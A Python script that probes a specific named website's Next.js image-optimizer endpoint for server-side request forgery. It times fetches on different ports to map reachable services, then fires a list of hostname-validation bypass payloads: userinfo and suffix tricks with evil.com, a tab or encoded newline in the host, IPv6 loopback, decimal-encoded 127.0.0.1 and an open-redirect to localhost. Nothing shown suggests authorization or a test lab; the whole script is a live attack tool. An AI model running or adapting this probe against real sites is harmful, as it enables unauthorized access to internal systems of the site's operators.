import requests, os, time, urllib.parse
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
GOOD = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"

def g(u, w=640, q=75, label=None, timeout=45):
    path = "/_next/image?url="+urllib.parse.quote(u, safe='')+"&w=%s&q=%s"%(w,q)
    t0=time.time()
    try:
        r = requests.get(T+path, headers=H, timeout=timeout, allow_redirects=False)
        dt=time.time()-t0
        body = r.text[:140].replace('\n',' ') if len(r.content)<3000 else r.headers.get('content-type')
        print("%-44s %s len=%-7d %5.2fs %s" % (label or u[:44], r.status_code, len(r.content), dt, body))
        return r,dt
    except Exception as e:
        print("%-44s ERR %.1fs %s" % (label or u[:44], time.time()-t0, e)); return None,0

print("=== C. Does the optimizer really FETCH? distinguishing outcomes ===")
g(GOOD, label="valid asset (expect 200 fast)")
g("https://images.ctfassets.net/this-path-does-not-exist-zz.jpg", label="valid host, bogus path (fetch 404?)")
g("https://images.ctfassets.net/", label="valid host, root path")
g("https://images.ctfassets.net:443/"+GOOD.split('.net/')[1], label="explicit :443 + valid asset")
g("https://images.ctfassets.net:8443/", label=":8443 (already saw 502/27s)")
g("https://images.ctfassets.net:22/", label=":22 ssh port")
g("https://images.ctfassets.net:1337/", label=":1337")

print()
print("=== D. hostname-validation bypass attempts (is it exact-match or suffix?) ===")
byp = [
 ("uppercase host", "https://IMAGES.CTFASSETS.NET/yts1dx0j7jj5/1GCT0vyjqmOwmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"),
 ("trailing dot", "https://images.ctfassets.net./yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"),
 ("subdomain", "https://evil.images.ctfassets.net/x.jpg"),
 ("suffix attack", "https://images.ctfassets.net.evil.com/x.jpg"),
 ("prefix attack", "https://notimages.ctfassets.net/x.jpg"),
 ("userinfo trick","https://evil.com@images.ctfassets.net/x.jpg"),
 ("userinfo 2",   "https://images.ctfassets.net@evil.com/x.jpg"),
 ("openredir-ish","https://images.ctfassets.net/redirect?url=https://127.0.0.1/"),
 ("tab in host",  "https://images.ctfassets.net\t.evil.com/x.jpg"),
 ("backslash",    "https://images.ctfassets.net\\@evil.com/x.jpg"),
 ("double scheme","https://images.ctfassets.net%0a.evil.com/x.jpg"),
 ("v6",           "http://[::1]/x.jpg"),
 ("decimal ip",   "https://2130706433/x.jpg"),
]
for lab,u in byp: g(u, label=lab)
